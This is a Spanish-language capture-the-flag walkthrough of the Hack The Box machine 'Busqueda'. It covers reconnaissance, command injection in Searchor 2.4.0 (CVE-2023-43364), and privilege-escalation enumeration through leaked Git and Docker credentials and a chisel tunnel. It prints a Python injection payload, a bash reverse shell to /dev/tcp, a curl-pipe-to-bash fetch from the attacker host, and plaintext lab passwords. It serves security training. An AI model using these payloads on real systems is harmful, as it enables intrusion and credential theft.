---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Busqueda

`Busqueda` es una máquina Linux de dificultad fácil que implica explotar una vulnerabilidad de inyección de comandos presente en un módulo `Python`. Al aprovechar esta vulnerabilidad, obtenemos acceso a nivel de usuario a la máquina. Para escalar privilegios a `root`, descubrimos credenciales dentro de un archivo de configuración `Git`, lo que nos permite iniciar sesión en un servicio `Gitea` local. Además, descubrimos que un script de verificación del sistema puede ser ejecutado con privilegios `root` por un usuario específico. Al utilizar este script, enumeramos los contenedores `Docker` que revelan las credenciales para la cuenta `Gitea` del usuario `administrador`. Un análisis más detallado del código fuente del script de verificación del sistema en un repositorio `Git` revela un medio para explotar una referencia de ruta relativa, lo que nos otorga Ejecución remota de código (RCE) con privilegios `root`.

<figure><img src="../../.gitbook/assets/Busqueda.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Busqueda**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.208 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 05:37 CET
Initiating SYN Stealth Scan at 05:37
Scanning 10.10.11.208 [65535 ports]
Discovered open port 22/tcp on 10.10.11.208
Discovered open port 80/tcp on 10.10.11.208
Completed SYN Stealth Scan at 05:37, 12.14s elapsed (65535 total ports)
Nmap scan report for 10.10.11.208
Host is up, received user-set (0.054s latency).
Scanned at 2025-02-13 05:37:35 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65541 (2.622MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.208
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache`.

```bash
❯ nmap -sCV -p22,80 10.10.11.208 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 05:38 CET
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   59.87 ms 10.10.16.1
2   29.86 ms searcher.htb (10.10.11.208)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep searcher
10.10.11.208 searcher.htb
```

## Web Enumeration

Realizaremos una comprobación de las tecnologías que utiliza el sitio web.

```bash
❯ whatweb http://searcher.htb
http://searcher.htb [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```

Revisaremos las cabeceras de la página web, podemos confirmar que utiliza como servidor `Werkzeug` y `Python`.

```bash
❯ curl -I http://searcher.htb
HTTP/1.1 200 OK
Date: Thu, 13 Feb 2025 04:46:42 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 13519
```

Realizamos una enumeración de directorios y páginas web a través de `feroxbuster`, logramos obtener el siguiente resultado.

```bash
❯ feroxbuster -u http://searcher.htb
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://searcher.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://searcher.htb/search
200      GET      430l      751w    13519c http://searcher.htb/
403      GET        9l       28w      277c http://searcher.htb/server-status
[######>-------------] - 23s     9761/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9771/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9772/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9792/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9817/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9824/30002   49s     found:3       errors:7      
[####################] - 81s    30002/30002   0s      found:3       errors:36     
[####################] - 81s    30001/30001   371/s   http://searcher.htb/  
```

Accedemos a[ http://searcher.htb](http://searcher.htb) y verificaremos la siguiente página web.

Esta plataforma nos permite realizar búsquedas en múltiples motores, como Google, YouTube, DuckDuckGo y eBay, entre otros.

Además, nos ofrece la posibilidad de monitorizar menciones públicas en redes sociales y la web, facilitando el seguimiento de nuestra presencia en línea desde un panel centralizado.

Para usarla, solo necesitamos:

1. Seleccionar el motor de búsqueda.
2. Escribir nuestra consulta.
3. Hacer clic en "Search".

Si activamos la opción de redirección automática, seremos llevados directamente a los resultados. De lo contrario, obtendremos la URL de la búsqueda para utilizarla como queramos.

<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizaremos una búsqueda básica para ver el funcionamiento de la página web.

<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En el resultado obtenido, verificamos que se ha realizado la siguiente búsqueda.

<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Access

### Searchor 2.4.0 - Command Injection (CVE-2023-43364)

En la propia página web de `Busqueda`, nos encontramos que la página web utiliza `Flask` y `Searchor 2.4.0`.

<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizando una búsqueda por Internet de posibles vulnerabilidades sobre esta versión, nos encontramos con el siguiente `CVE-2023-43364`.

{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-43364" %}

{% hint style="danger" %}
main.py en Searchor anterior a 2.4.2 usa eval en la entrada CLI, lo que puede provocar la ejecución inesperada de código.
{% endhint %}

Por otro lado, nos encontramos con el siguiente repositorio de GitHub que automatiza la explotación de la vulnerabilidad otorgándonos una Reverse Shell.

{% embed url="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection" %}

Nos pondremos en escucha con `nc` para recibir la Reverse Shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Realizaremos la explotación indicando el target vulnerable y nuestra dirección y puerto donde recibiremos la Reverse Shell.

```bash
❯ ./exploit.sh searcher.htb 10.10.16.7 443
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.16.7:443
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

Verificamos que hemos ganado el acceso correctamente al equipo.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.208] 37882
bash: cannot set terminal process group (1646): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 
```

Para realizar la explotación manual, interceptaremos con `BurpSuite` la solicitud de [http://searcher.htb/search?engine=Google\&query=](http://searcher.htb/search?engine=Google\&query=). Inyectaremos el siguiente comando, al enviar la solicitud, comprobamos en la respuesta por parte del servidor recibimos el resultado de la ejecución de comandos.

```bash
' + __import__('os').popen('id').read() + '
```

<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

El siguiente paso, será lograr obtener una Reverse Shell. Para ello, crearemos en nuestro equipo un archivo llamado `shell.sh` que contiene la Reverse Shell, compartiremos el script a través de un servidor web.

```bash
❯ cat shell.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1'

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde otra terminal nos pondremos en escucha con `nc`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Realizaremos la siguiente inyección de comando para que realize la petición con`cURL` de nuestro script `shell.sh` y lo ejecutará en una `bash`.

```bash
' + __import__('os').popen('curl http://10.10.16.7/shell.sh|bash').read() + '
```

<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verificamos que finalmente ganamos acceso al sistema con el usuario`svc` y logramos comprobar la flag de **user.txt**.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.208] 46348
bash: cannot set terminal process group (1646): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ cat /home/svc/user.txt 
26d7ad943e8f5*******************
```

## Privilege Escalation

### Information Leakage to access Gitea

Al acceder al equipo, verificamos que al revisar los permisos de `sudoers` nos requiere ingresar las credenciales del usuario, las cuales no disponemos actualmente. Revisamos los grupos a los que forma parte y tampoco disponemos de algún grupo que podamos abusar para escalar nuestros privilegios.

```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
sudo: a password is required
svc@busqueda:/var/www/app/.git$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

Enumerando el directorio `/var/www/app` nos encontramos con un repositorio de `/.git` en el cual contiene un archivo de configuración con lo que parecen ser credenciales de acceso del usuario `cody`.

```bash
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Feb 13 04:37 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
svc@busqueda:/var/www/app$ cd .git/
svc@busqueda:/var/www/app/.git$ ls -la
total 52
drwxr-xr-x 8 www-data www-data 4096 Feb 13 04:37 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
-rw-r--r-- 1 root     root      259 Apr  3  2023 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Enumerando el directorio personal del usuario `svc` también observamos un archivo `.gitconfig` el cual contiene la configuración del usuario `cody`.

```bash
svc@busqueda:~$ ls -la
total 36
drwxr-x--- 4 svc  svc  4096 Apr  3  2023 .
drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28  2023 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3  2023 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3  2023 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20  2023 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Feb 13 04:37 user.txt
svc@busqueda:~$ cat .gitconfig 
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks
```

Revisaremos los puertos internos del equipo, y logramos encontrar el puerto **3000** abierto, que normalmente es utilizado para `Gitea`.

```bash
svc@busqueda:/var/www/app/.git$ netstat -ano | grep LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:36977         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
```

Realizamos una petición con `cURL` al servidor **127.0.0.1:3000** en el cual nos devuelve información de la página web relacionada con `Gitea`.

```bash
svc@busqueda:/var/www/app/.git$ curl 127.0.0.1:3000
<!DOCTYPE html>
<html lang="en-US" class="theme-auto">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Gitea: Git with a cup of tea</title>
	<link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdlL3BuZyIsInNpemVzIjoiNTEyeDUxMiJ9LHsic3JjIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19">
	<meta name="theme-color" content="#6cc644">
	<meta name="default-theme" content="auto">
	<meta name="author" content="Gitea - Git with a cup of tea">
	<meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
	<meta name="keywords" content="go,git,self-hosted,gitea">
	<meta name="referrer" content="no-referrer">
```

El siguiente objetivo será realizar **Port Forwarding** con `chisel` para lograr tener acceso a la página web de `Gitea`. Para ello, compartiremos el binario de `chisel` a través de un servidor web.

```bash
❯ ls -l chisel
.rwxrwxr-x kali kali 8.9 MB Thu Feb 13 06:27:17 2025  chisel

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde el equipo comprometido, nos descargaremos el binario de `chisel` y le daremos los permisos de ejecución correspondientes.

```bash
svc@busqueda:/tmp$ wget 10.10.16.7/chisel
--2025-02-13 05:28:28--  http://10.10.16.7/chisel
Connecting to 10.10.16.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9371800 (8.9M) [application/octet-stream]
Saving to: ‘chisel’

chisel              100%[===================>]   8.94M  14.4MB/s    in 0.6s    

2025-02-13 05:28:29 (14.4 MB/s) - ‘chisel’ saved [9371800/9371800]

svc@busqueda:/tmp$ chmod +x chisel 
```

En nuestro equipo local, configuraremos `chisel` para que actúe como servidor.

```bash
❯ ./chisel server --reverse -p 1234
2025/02/13 06:28:08 server: Reverse tunnelling enabled
2025/02/13 06:28:08 server: Fingerprint xFMTGHlQJdJsHHdW3CIYK8LVKjgF03JbfqsK8OAo85A=
2025/02/13 06:28:08 server: Listening on http://0.0.0.0:1234
```

Desde el equipo comprometido, configuraremos `chisel` para que actúe como cliente de nuestro servidor y compartiremos el puerto 3000 interno a que sea el puerto 80 de nuestro equipo local.

```bash
svc@busqueda:/tmp$ ./chisel client 10.10.16.7:1234 R:80:127.0.0.1:3000
2025/02/13 05:36:41 client: Connecting to ws://10.10.16.7:1234
2025/02/13 05:36:42 client: Connected (Latency 33.301115ms)
```

Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep searcher
127.0.0.1	localhost kali gitea.searcher.htb
```

Accederemos a [http://gitea.searcher.htb](http://gitea.searcher.htb) y probaremos de acceder con las credenciales del usuario `cody` localizadas anteriormente.

<figure><img src="../../.gitbook/assets/imagen (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Enumerando el `Gitea`, logramos encontrar un repositorio propio de nuestro usuario.

<figure><img src="../../.gitbook/assets/imagen (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisamos el repositorio que disponemos, y comprobamos que se trata del archivo de `Searchor`, la página web desde la cual obtuvimos el acceso inicial al sistema.

<figure><img src="../../.gitbook/assets/imagen (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Abusing sudoers privilege + Information Leakage in Docker Containers

Probamos de validar si las credenciales del usuario `cody` de `Gitea` servían para el usuario `svc` y comprobamos que son sus credenciales correctas.

Al analizar si disponíamos de privilegios de `sudoers`, nos encontramos que podemos ejecutar el siguiente script en `/opt/scripts/system-checkup.py`.

```bash
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Enumeramos el directorio `/opt/scripts` en los cuales aparecen diversos script de Bash y Python, al intentar comprobar el contenido de estos archivos se nos indica `Permission denied`.

```bash
svc@busqueda:~$ ls -l /opt/scripts/
total 16
-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py

svc@busqueda:~$ cat /opt/scripts/*
cat: /opt/scripts/check-ports.py: Permission denied
cat: /opt/scripts/full-checkup.sh: Permission denied
cat: /opt/scripts/install-flask.sh: Permission denied
cat: /opt/scripts/system-checkup.py: Permission denied
```

Probamos de ejecutar el script de Python como `sudo` y nos aparece un mensaje indicando que no disponemos del acceso para ejecutar el binario.

Al intentar poner otro valor a la hora de ejecutar el script, verificamos que nos permite ejecutar diversos comandos de `Docker`, como listar los contenedores en ejecución, inspeccionar y realizar un escaneo del sistema.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

A través del siguiente comando, comprobaremos mediante el script `system-checkup.py` los contenedores de Docker en ejecución, entre los que encontramos contenedores de `Gitea` y `MySQL`.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Al intentar inspeccionar el contenedor, se nos indica el uso correcto de la herramienta, se nos requiere especificar el formato y el nombre del contenedor.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect gitea
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

Por la estructura del comando, parece ser comandos de Docker nativos. Con lo cual, decidimos consultar la información oficial de `Docker` sobre el comando de `docker` `inspect`

{% embed url="https://docs.docker.com/reference/cli/docker/inspect/" %}

En este caso, inspeccionamos el contenedor de `Gitea` para que nos muestre el resultado en formato `JSON`. En el resultado obtenido, nos aparecen credenciales de una base de datos llamada `gitea`.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
{
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "State": {
    "Status": "running",
    "Running": true,
    "Paused": false,
    "Restarting": false,
    "OOMKilled": false,
    "Dead": false,
    "Pid": 1813,
    "ExitCode": 0,
    "Error": "",
    "StartedAt": "2025-02-13T04:37:25.273234426Z",
    "FinishedAt": "2023-04-04T17:03:01.71746837Z"
  },
  
...[snip]---

    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
```

Inspeccionamos el contenedor `mysql` para enumerar la configuración de dicho contenedor, la información era bastante amplia.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql | jq .
{
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
      "MYSQL_USER=gitea",
      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
      "MYSQL_DATABASE=gitea",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "GOSU_VERSION=1.14",
      "MYSQL_MAJOR=8.0",
      "MYSQL_VERSION=8.0.31-1.el8",
      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
    ],
    "Cmd": 
        "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
        "EndpointID": "65b29932ec694c85766bacba4fdbe26c12de8d00af399737b1c5389a7bdc7a76",
        "Gateway": "172.19.0.1",
        "IPAddress": "172.19.0.3",
        "IPPrefixLen": 16,
        "IPv6Gateway": "",
        "GlobalIPv6Address": "",
        "GlobalIPv6PrefixLen": 0,
        "MacAddress": "02:42:ac:13:00:03",
        "DriverOpts": null
      }
    }
  }
}
```

Al realizar la ejecución del último comando, se nos indicaba que había ocurrido algún error, intentamos añadir algún parámetro, etc pero obtuvimos siempre le mismo resultado.

```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

Enumeramos la configuración de red que disponía el contenedor de `mysql`. En el resultado obtenido, comprobamos que el contenedor de `mysql` operaba a través de la IP **172.19.0.3**.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "65b29932ec694c85766bacba4fdbe26c12de8d00af399737b1c5389a7bdc7a76",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
```

Revisamos la interfaz de `docker0` que tenía el equipo comprometido y verificamos que estuviese y tuviese conectividad con la que operaba el `MySQL`.

```bash
svc@busqueda:~$ ifconfig docker0
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:2c:0d:9b:c6  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

svc@busqueda:~$ ping -c 1 172.19.0.3
PING 172.19.0.2 (172.19.0.3) 56(84) bytes of data.
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.051 ms

--- 172.19.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms
```

Probamos de acceder al `MySQL` del contenedor de Docker con el usuario `gitea` y las credenciales localizadas en la configuración del contenedor `gitea` a través de la dirección IP **172.19.0.3**.&#x20;

Logramos obtener el acceso correspondiente y enumerar las tablas, entre las cuales aparecía la tabla `users`.

```bash
svc@busqueda:~$ mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 225
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW TABLES;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| app_state                 |
| attachment                |
| badge                     |
| collaboration             |
| comment                   |
| commit_status             |
| commit_status_index       |
| deleted_branch            |
| deploy_key                |
| email_address             |
| email_hash                |
| external_login_user       |
| follow                    |
| foreign_reference         |
| gpg_key                   |
| gpg_key_import            |
| hook_task                 |
| issue                     |
| issue_assignees           |
| issue_content_history     |
| issue_dependency          |
| issue_index               |
| issue_label               |
| issue_user                |
| issue_watch               |
| label                     |
| language_stat             |
| lfs_lock                  |
| lfs_meta_object           |
| login_source              |
| milestone                 |
| mirror                    |
| notice                    |
| notification              |
| oauth2_application        |
| oauth2_authorization_code |
